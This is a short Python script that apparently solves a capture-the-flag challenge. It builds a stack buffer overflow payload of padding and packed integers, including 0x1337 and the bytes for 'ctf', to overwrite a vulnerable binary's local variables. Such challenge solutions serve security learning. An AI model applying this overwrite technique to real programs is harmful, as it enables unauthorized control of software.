#!/usr/bin/python3

import struct



#Here pc represents variable local_10 
#     p10 represents variable local_14
#     p14 represents variable local_18
#     p18 represents variable local_1c
#     p1c represents variable local_20
#     p represents variable local_30


p1c = struct.pack("I",0x0000002a)
p18 = struct.pack("I",0x00000000)
p14 = struct.pack("I",0x00667463)
p10 = struct.pack("I",0xffffffeb)
pc =  struct.pack("I",0x00001337)

p = struct.pack("I",0x00000000)

print(p*4+p1c+p18+p14+p10+pc)


